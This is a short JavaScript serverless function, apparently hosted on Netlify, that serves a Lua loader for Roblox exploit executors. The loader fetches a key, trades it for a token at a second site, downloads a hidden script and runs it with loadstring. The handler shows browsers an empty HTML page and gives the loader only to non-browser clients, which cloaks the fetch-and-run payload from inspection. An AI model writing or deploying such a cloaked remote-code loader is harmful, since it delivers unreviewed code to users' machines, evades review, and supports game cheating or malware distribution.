
const loader = `local HttpService = game:GetService("HttpService")

local keyResponse = request({
    Url = "https://keynamesojik.netlify.app/",
    Method = "GET",
    Headers = {
        ["Accept"] = "text/plain"
    }
})

local function good(response)
    local code = tonumber(response.StatusCode or response.Status or 0)
    return code >= 200 and code < 300
end

if not good(keyResponse) then
    error("키 요청 실패: " .. tostring(keyResponse.StatusCode))
end

local key = tostring(keyResponse.Body):gsub("%s+", "")

local tokenResponse = request({
    Url = "https://script-vault-yr.carvedcocoa512.chatgpt.site/api/request",
    Method = "POST",
    Headers = {
        ["Content-Type"] = "application/json",
        ["Accept"] = "application/json"
    },
    Body = HttpService:JSONEncode({
        isScript = true,
        siteId = "73d17995c8184b",
        key = key
    })
})

if not good(tokenResponse) then
    error("token error: " .. tostring(tokenResponse.StatusCode) .. "\\n" .. tostring(tokenResponse.Body))
end

local token = HttpService:JSONDecode(tokenResponse.Body).token

local scriptResponse = request({
    Url = "https://script-vault-yr.carvedcocoa512.chatgpt.site/api/script?IsScript=true&token=" .. HttpService:UrlEncode(token),
    Method = "GET"
})

if not good(scriptResponse) then
    error("error: " .. tostring(scriptResponse.StatusCode) .. "\\n" .. tostring(scriptResponse.Body))
end

loadstring(scriptResponse.Body)()`;

exports.handler = async (event) => {
    const accept = event.headers?.accept || "";

    if (accept.includes("text/html")) {
        return {
            statusCode: 200,
            headers: {
                "Content-Type": "text/html; charset=utf-8"
            },
            body: "<!DOCTYPE html><html><body></body></html>"
        };
    }

    return {
        statusCode: 200,
        headers: {
            "Content-Type": "text/plain; charset=utf-8"
        },
        body: loader
    };
};
